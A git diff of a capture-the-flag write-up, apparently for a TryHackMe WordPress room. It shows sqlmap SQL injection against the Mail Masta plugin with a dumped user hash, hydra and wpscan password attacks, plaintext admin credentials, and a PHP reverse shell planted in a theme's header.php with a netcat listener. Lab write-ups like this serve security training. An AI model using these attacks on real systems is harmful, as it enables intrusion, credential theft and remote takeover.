@@ -254,6 +254,93 @@ hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/w
 sudo wpscan --password-attack xmlrpc -t 20 -U elyana -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
 ```
   * THM target host timed out before completion.
+
+#### Exploit Mail Masta SQLi.
+* Page `./wp-content/plugins/mail-masta/inc/lists/csvexport.php` (Unauthenticated).
+* GET parameter:`list_id`.
+**Enumerate databases**
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
+```
+* `-u` specifies target URL.
+* `--dbs` tells SQLMap to try to enumerate database.
+```
+available databases [2]:
+[*] information_schema
+[*] wordpress
+```
+**List tables within "wordpress" database**
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables
+
+Database: wordpress
+[23 tables]
++----------------------------+
+| wp_commentmeta             |
+| wp_comments                |
+| wp_links                   |
+| wp_masta_campaign          |
+| wp_masta_cronapi           |
+| wp_masta_list              |
+| wp_masta_reports           |
+| wp_masta_responder         |
+| wp_masta_responder_reports |
+| wp_masta_settings          |
+| wp_masta_subscribers       |
+| wp_masta_support           |
+| wp_options                 |
+| wp_postmeta                |
+| wp_posts                   |
+| wp_reflex_gallery          |
+| wp_reflex_gallery_images   |
+| wp_term_relationships      |
+| wp_term_taxonomy           |
+| wp_termmeta                |
+| wp_terms                   |
+| wp_usermeta                |
+| wp_users                   |
++----------------------------+
+```
+**List columns within "wp_users" table**
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns
+
+Database: wordpress
+Table: wp_users
+[10 columns]
++---------------------+---------------------+
+| Column              | Type                |
++---------------------+---------------------+
+| display_name        | varchar(250)        |
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(255)        |
+| user_email          | varchar(100)        |
+| user_login          | varchar(60)         |
+| user_nicename       | varchar(50)         |
+| user_pass           | varchar(255)        |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
++---------------------+---------------------+
+```
+**Dump contents of "wp_users" table**
+```
+Database: wordpress
+Table: wp_users
+[1 entry]
++----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url                       | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana     | none@none.com | 0           | elyana       | elyana        | 2020-10-05 19:55:50 | <blank>             |
++----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+```
+* Elyana is only user on target host.
+**Attempt to crack "user_pass" hash**
+* [CyberChef](https://gchq.github.io/CyberChef/#recipe=Analyse_hash()&input=JFAkQmh3VkxWTGs1ZkdSUHlvRWZtQmZWczgyYlk3ZlNxMQ) reports that hash is invalid when analysed.
+* [hashes.com](https://hashes.com/en/decrypt/hash) could not find a match.
+* [crackstation.net](https://crackstation.net/) returned an "unrecognized hash format".
+* hashcat?
+
 #### Exploit Mail Masta LFI vulnerability.
 > "pl" parameter allows inclusion of a file without any type of input validation or sanitisation. Can attempt to include arbitrary files on the webserver. E.g. display contents of /etc/passwd file using cURL.
 ```
@@ -405,89 +492,42 @@ if ( ! defined( 'ABSPATH' ) ) {
 /** Sets up WordPress vars and included files. */
 require_once ABSPATH . 'd3A
 ```
-#### Exploit Mail Masta SQLi.
-* Page `./wp-content/plugins/mail-masta/inc/lists/csvexport.php` (Unauthenticated).
-* GET parameter:`list_id`.
-**Enumerate databases**
+* Successfully logged into WordPress "/wp-admin" using MySQL db credentials.
+  * elyana / H@ckme@123
+* Credentials are invalid for SSH.
 ```
-sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
+ssh elyana@10.10.199.13
+The authenticity of host '10.10.199.13 (10.10.199.13)' can't be established.
+ECDSA key fingerprint is SHA256:IVzQLYHc196APvwnH40vFHjOR4ZsfNqxHnOG3HuzXgg.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.199.13' (ECDSA) to the list of known hosts.
+elyana@10.10.199.13's password: 
+Permission denied, please try again.
 ```
-* `-u` specifies target URL.
-* `--dbs` tells SQLMap to try to enumerate database.
-```
-available databases [2]:
-[*] information_schema
-[*] wordpress
-```
-**List tables within "wordpress" database**
-```
-sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables
-
-Database: wordpress
-[23 tables]
-+----------------------------+
-| wp_commentmeta             |
-| wp_comments                |
-| wp_links                   |
-| wp_masta_campaign          |
-| wp_masta_cronapi           |
-| wp_masta_list              |
-| wp_masta_reports           |
-| wp_masta_responder         |
-| wp_masta_responder_reports |
-| wp_masta_settings          |
-| wp_masta_subscribers       |
-| wp_masta_support           |
-| wp_options                 |
-| wp_postmeta                |
-| wp_posts                   |
-| wp_reflex_gallery          |
-| wp_reflex_gallery_images   |
-| wp_term_relationships      |
-| wp_term_taxonomy           |
-| wp_termmeta                |
-| wp_terms                   |
-| wp_usermeta                |
-| wp_users                   |
-+----------------------------+
-```
-**List columns within "wp_users" table**
-```
-sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns
-
-Database: wordpress
-Table: wp_users
-[10 columns]
-+---------------------+---------------------+
-| Column              | Type                |
-+---------------------+---------------------+
-| display_name        | varchar(250)        |
-| ID                  | bigint(20) unsigned |
-| user_activation_key | varchar(255)        |
-| user_email          | varchar(100)        |
-| user_login          | varchar(60)         |
-| user_nicename       | varchar(50)         |
-| user_pass           | varchar(255)        |
-| user_registered     | datetime            |
-| user_status         | int(11)             |
-| user_url            | varchar(100)        |
-+---------------------+---------------------+
-```
-**Dump contents of "wp_users" table**
-```
-Database: wordpress
-Table: wp_users
-[1 entry]
-+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
-| ID | user_url                       | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
-+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
-| 1  | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana     | none@none.com | 0           | elyana       | elyana        | 2020-10-05 19:55:50 | <blank>             |
-+----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
-```
-* Elyana is only user on target host.
-**Attempt to crack "user_pass" hash**
-* [CyberChef](https://gchq.github.io/CyberChef/#recipe=Analyse_hash()&input=JFAkQmh3VkxWTGs1ZkdSUHlvRWZtQmZWczgyYlk3ZlNxMQ) reports that hash is invalid when analysed.
-* [hashes.com](https://hashes.com/en/decrypt/hash) could not find a match.
-* [crackstation.net](https://crackstation.net/) returned an "unrecognized hash format".
-* hashcat?
 ## Privilege Escalation
+* WordPress Appearance > Theme Editor.
+* Open "Theme Header" (header.php) from "Theme Files" list.
+* Copy "php-reverse-shell.php" to working folder.
+```
+cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/AllinOne
+```
+* Open copy of "php-reverse-shell.php".
+* Edit "ip" field.
+* Save and close file.
+* Copy and paste code from reverse shell to top of "header.php" file in WordPress.
+* Start netcat listener on attack host.
+```
+nc -lvnp 1234
+```
+* "Update File" in WordPress to save changes and launch remote shell.
+* Shell caught by listener.
+```
+Connection from 10.10.199.13 44038 received!
+Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 16:04:53 up 27 min,  0 users,  load average: 0.00, 0.00, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
